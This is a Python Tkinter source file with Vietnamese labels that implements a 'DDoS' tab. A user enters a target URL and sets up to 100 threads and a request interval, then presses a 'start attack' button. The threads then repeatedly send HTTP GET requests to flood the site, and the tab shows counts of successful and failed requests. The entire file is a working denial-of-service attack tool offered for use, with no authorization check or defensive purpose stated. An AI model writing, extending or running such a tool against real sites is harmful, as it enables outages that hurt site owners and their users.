import tkinter as tk
from tkinter import ttk
import threading
import time
import requests
from urllib.parse import urlparse
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))

# Cải thiện tính tương thích
try:
    from Core.utils import Logger
except ImportError:
    try:
        from Core.utils import Logger
    except ImportError:
        # Định nghĩa Logger đơn giản nếu không import được
        class Logger:
            def __init__(self):
                pass
                
            def log(self, message, level="INFO"):
                print(f"[{level}] {message}")

class DDoSTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.logger = Logger()
        self.is_attacking = False
        self.attack_thread = None
        self.threads = []
        self.thread_count = 10  # Khởi tạo giá trị mặc định
        self.request_interval = 100  # Khởi tạo giá trị mặc định
        self.total_requests = 0
        self.success_requests = 0
        self.failed_requests = 0
        
        self.setup_ui()
        
    def setup_ui(self):
        # URL Input
        ttk.Label(self, text="URL mục tiêu:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.url_entry = ttk.Entry(self, width=50)
        self.url_entry.grid(row=0, column=1, columnspan=2, padx=5, pady=5, sticky="we")
        
        # Thread Count
        ttk.Label(self, text="Số luồng:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.thread_scale = ttk.Scale(self, from_=1, to=100, orient="horizontal", length=200)
        self.thread_scale.set(10)
        self.thread_scale.grid(row=1, column=1, padx=5, pady=5, sticky="we")
        
        self.thread_value_label = ttk.Label(self, text="10")
        self.thread_value_label.grid(row=1, column=2, padx=5, pady=5, sticky="w")
        
        # Request Interval
        ttk.Label(self, text="Khoảng thời gian giữa các request (ms):").grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.interval_scale = ttk.Scale(self, from_=0, to=1000, orient="horizontal", length=200)
        self.interval_scale.set(100)
        self.interval_scale.grid(row=2, column=1, padx=5, pady=5, sticky="we")
        
        self.interval_value_label = ttk.Label(self, text="100 ms")
        self.interval_value_label.grid(row=2, column=2, padx=5, pady=5, sticky="w")
        
        # Attack Button
        self.attack_button = ttk.Button(self, text="BẮT ĐẦU TẤN CÔNG", command=self.toggle_attack)
        self.attack_button.grid(row=3, column=0, columnspan=3, padx=5, pady=10, sticky="we")
        
        # Status
        self.status_frame = ttk.LabelFrame(self, text="Trạng thái")
        self.status_frame.grid(row=4, column=0, columnspan=3, padx=5, pady=5, sticky="we")
        
        ttk.Label(self.status_frame, text="Trạng thái:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.status_label = ttk.Label(self.status_frame, text="Chưa tấn công")
        self.status_label.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        
        ttk.Label(self.status_frame, text="Tổng số request:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.request_count_label = ttk.Label(self.status_frame, text="0")
        self.request_count_label.grid(row=1, column=1, padx=5, pady=5, sticky="w")
        
        ttk.Label(self.status_frame, text="Request thành công:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.success_count_label = ttk.Label(self.status_frame, text="0")
        self.success_count_label.grid(row=2, column=1, padx=5, pady=5, sticky="w")
        
        ttk.Label(self.status_frame, text="Request thất bại:").grid(row=3, column=0, padx=5, pady=5, sticky="w")
        self.failed_count_label = ttk.Label(self.status_frame, text="0")
        self.failed_count_label.grid(row=3, column=1, padx=5, pady=5, sticky="w")
        
        # Log Area
        self.log_frame = ttk.LabelFrame(self, text="Log hoạt động")
        self.log_frame.grid(row=5, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")
        
        self.log_text = tk.Text(self.log_frame, height=10, width=50)
        self.log_text.pack(padx=5, pady=5, fill="both", expand=True)
        
        self.columnconfigure(1, weight=1)
        self.rowconfigure(5, weight=1)
        
        # Thiết lập các callback sau khi tạo UI
        self.thread_scale.configure(command=self.update_thread_count)
        self.interval_scale.configure(command=self.update_interval)
        
    def update_thread_count(self, event=None):
        try:
            self.thread_count = int(float(self.thread_scale.get()))
            self.thread_value_label.config(text=str(self.thread_count))
        except Exception as e:
            print(f"Lỗi khi cập nhật thread count: {e}")
        
    def update_interval(self, event=None):
        try:
            self.request_interval = int(float(self.interval_scale.get()))
            self.interval_value_label.config(text=f"{self.request_interval} ms")
        except Exception as e:
            print(f"Lỗi khi cập nhật interval: {e}")
    
    def toggle_attack(self):
        if not self.is_attacking:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        target_url = self.url_entry.get().strip()
        if not target_url:
            self.log("Vui lòng nhập URL mục tiêu", "ERROR")
            return
        
        try:
            # Validate URL
            parsed_url = urlparse(target_url)
            if not parsed_url.scheme or not parsed_url.netloc:
                self.log("URL không hợp lệ. Vui lòng nhập URL đầy đủ (ví dụ: https://example.com)", "ERROR")
                return
        except Exception as e:
            self.log(f"URL không hợp lệ: {str(e)}", "ERROR")
            return
        
        self.is_attacking = True
        self.attack_button.config(text="DỪNG TẤN CÔNG")
        self.status_label.config(text="Đang tấn công...")
        
        # Reset counters
        self.total_requests = 0
        self.success_requests = 0
        self.failed_requests = 0
        self.update_stats()
        
        # Start attack thread
        self.attack_thread = threading.Thread(target=self.attack_manager, args=(target_url,))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        self.log(f"Bắt đầu tấn công {target_url} với {self.thread_count} luồng", "INFO")
    
    def stop_attack(self):
        self.is_attacking = False
        self.attack_button.config(text="BẮT ĐẦU TẤN CÔNG")
        self.status_label.config(text="Đã dừng tấn công")
        self.log("Đã dừng tấn công", "INFO")
        
        # Clear all running threads
        self.threads = []
    
    def attack_manager(self, target_url):
        while self.is_attacking:
            try:
                # Maintain thread count
                active_threads = sum(1 for t in self.threads if t.is_alive())
                needed_threads = self.thread_count - active_threads
                
                if needed_threads > 0:
                    for _ in range(needed_threads):
                        if not self.is_attacking:
                            break
                        thread = threading.Thread(target=self.send_requests, args=(target_url,))
                        thread.daemon = True
                        thread.start()
                        self.threads.append(thread)
                
                # Clean up finished threads
                self.threads = [t for t in self.threads if t.is_alive()]
            except Exception as e:
                self.log(f"Lỗi trong quản lý tấn công: {str(e)}", "ERROR")
            
            time.sleep(1)
    
    def send_requests(self, target_url):
        while self.is_attacking:
            try:
                response = requests.get(target_url, timeout=5)
                self.total_requests += 1
                if response.status_code < 400:
                    self.success_requests += 1
                    self.log(f"Request thành công - Status: {response.status_code}", "SUCCESS")
                else:
                    self.failed_requests += 1
                    self.log(f"Request thất bại - Status: {response.status_code}", "WARNING")
            except Exception as e:
                self.total_requests += 1
                self.failed_requests += 1
                self.log(f"Request lỗi: {str(e)}", "ERROR")
            
            self.update_stats()
            time.sleep(self.request_interval / 1000)  # Convert ms to seconds
    
    def update_stats(self):
        try:
            # Update stats in the UI thread
            self.request_count_label.config(text=str(self.total_requests))
            self.success_count_label.config(text=str(self.success_requests))
            self.failed_count_label.config(text=str(self.failed_requests))
        except Exception as e:
            print(f"Lỗi khi cập nhật thống kê: {e}")
    
    def log(self, message, level="INFO"):
        try:
            self.logger.log(message, level)
            # Add log to UI
            self.log_text.insert(tk.END, f"[{level}] {message}\n")
            self.log_text.see(tk.END)  # Scroll to the end
        except Exception as e:
            print(f"Lỗi khi ghi log: {e}")